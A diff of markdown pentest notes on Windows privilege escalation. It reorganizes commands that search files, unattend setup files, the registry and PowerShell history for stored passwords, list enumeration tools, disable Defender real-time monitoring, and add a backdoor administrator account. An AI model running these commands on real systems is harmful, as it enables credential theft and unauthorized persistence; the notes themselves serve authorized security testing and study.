@@ -9,25 +9,18 @@
 [HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)\
 [Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html)
 
-https://lolbas-project.github.io/#
+* https://lolbas-project.github.io/#
 
-Windows 10 Exploits https://github.com/nu11secur1ty/Windows10Exploits &#x20;
+Windows 10 Exploits:
 
-### Console History&#x20;
-
-* Windows powershell saves all previous commands into a file called ConsoleHost\_history. This is located at
-
-```
-%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-```
+* https://github.com/nu11secur1ty/Windows10Exploits &#x20;
 
 ### Low Hanging Fruit&#x20;
 
 [Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes\_Windows\_Privesc.html)
 
 ```
-whoami /priv running process, can enable for different process if user has priv
-#State: disabled for running process, can enable for different process depending on access
+whoami /priv 
 SeImpersonatePrivilege -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
 SeAssignPrimaryTokenPrivilege -> Juicy Potato 
 SeTakeOwnershipPrivilege ->  become the owner of any object and modify the DACL to grant access.  
@@ -49,6 +42,16 @@ findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini
+
+dir c:\*password* /s
+dir c:\*pass* /s
+dir c:\*login* /s
+dir c:\*finance* /s
+dir c:\*.key /s
+dir c:\*.ica /s
+dir c:\*.pwd* /s
+dir c:\*.config* /s
+dir c:\*access* /s
 ```
 
 * Find strings in `.config` files
@@ -63,32 +66,35 @@ dir /s *pass* == *cred** == *vnc* == *.config*
 findstr /spin "password" *.*
 ```
 
+### Unattended Setup
+
+* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode."
+* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." It is also where users passwords are stored in base64. Navigate to:
 * Password files that could have base64 encoded credentials&#x20;
 
-```
-Unattended files
-C:\Windows\sysprep\sysprep.xml
-C:\Windows\sysprep\sysprep.inf
-C:\Windows\sysprep.inf
-C:\Windows\Panther\Unattended.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\Panther\Unattend\Unattended.xml
-C:\Windows\System32\Sysprep\unattend.xml
-C:\Windows\System32\Sysprep\unattended.xml
-C:\unattend.txt
-C:\unattend.inf
+<pre><code>Unattended files
+dir C:\Windows\sysprep\sysprep.xml
+dir C:\Windows\sysprep\sysprep.inf
+dir C:\Windows\sysprep.inf
+dir C:\Windows\Panther\Unattended.xml
+dir C:\Windows\Panther\Unattend.xml
+dir C:\Windows\Panther\Unattend\Unattend.xml
+<strong>dir C:\Windows\Panther\Unattend\Unattended.xml
+</strong>dir C:\Windows\System32\Sysprep\unattend.xml
+<strong>dir C:\Windows\System32\Sysprep\unattended.xml
+</strong><strong>dir C:\unattend.txt
+</strong>dir C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 
 dir C:\*.vnc.ini /s /b
 dir C:\*ultravnc.ini /s /b
 dir C:\ /s /b | findstr /si *vnc.ini
-```
+</code></pre>
 
 ### Search Registry for Passwords
 
 ```
-reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s      #admin needed
 reg query HKCU /f password /t REG_SZ /s
 ```
 
@@ -102,9 +108,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 * Powershell history
+* Windows powershell saves all previous commands into a file called `ConsoleHost_history.txt` This is located at:
 
 ```
-%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+dir %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 #### Windows Kernel Versions
@@ -120,13 +127,12 @@ Kernel 10 - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 
 
 #### Important Files
 
-```
-%SYSTEMROOT%\System32\drivers\etc\hosts                   #local DNS entries 
-%SYSTEMROOT%\System32\drivers\etc\networks                #network config
-%SYSTEMROOT%\Prefetch                                     #prefetch dir, exe logs
-%WINDIR%\system32\config\AppEvent.Evt                     #application logs
-%WINDIR%\system32\config\SecEvent.Evt                     #security logs
-```
+<pre><code><strong>dir %SYSTEMROOT%\System32\drivers\etc\hosts                   #local DNS entries 
+</strong>dir %SYSTEMROOT%\System32\drivers\etc\networks                #network config
+dir %SYSTEMROOT%\Prefetch                                     #prefetch dir, exe logs
+dir %WINDIR%\system32\config\AppEvent.Evt                     #application logs
+dir %WINDIR%\system32\config\SecEvent.Evt                     #security logs
+</code></pre>
 
 ### Scripts
 
@@ -139,28 +145,15 @@ Kernel 10 - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 
 [JAWS](https://github.com/411Hall/JAWS)\
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)\
 [PrivEscCheck](https://github.com/itm4n/PrivescCheck)\
-[Windows Exploit Suggester (Next-Generation)](https://github.com/bitsadmin/wesng) [Sherlock](https://github.com/rasta-mouse/Sherlock) [Priv2Admin](https://github.com/gtworek/Priv2Admin) OS priviliges to system
+[Windows Exploit Suggester (Next-Generation)](https://github.com/bitsadmin/wesng) [Sherlock](https://github.com/rasta-mouse/Sherlock) [Priv2Admin](https://github.com/gtworek/Priv2Admin) OS privileges to system
 
 [Compiled scripts here](https://github.com/Scr1ptK1ddie/WindowsBinaries)
-
-
 
 ### Run PowerUp
 
 ```
 . .\PowerUp.ps1
 Invoke-AllChecks
-```
-
-### Unattended Setup
-
-* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode."
-* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." It is also where users passwords are stored in base64. Navigate to:
-
-C:\Windows\Panther\Unattend\Unattended.xml.It is also where users passwords are stored in base64. Navigate to:
-
-```
-C:\Windows\Panther\Unattend\Unattended.xml.
 ```
 
 ### Kernel Exploits
@@ -185,10 +178,15 @@ start /B program
 REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
 ```
 
-### Enable:
+* enable&#x20;
 
 ```
 REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f
+```
+
+### Add Admin and Enable RDP
+
+```
 Add Admin & Enable RDP
 net user /add hacked Password1
 net localgroup administrators hacked /add
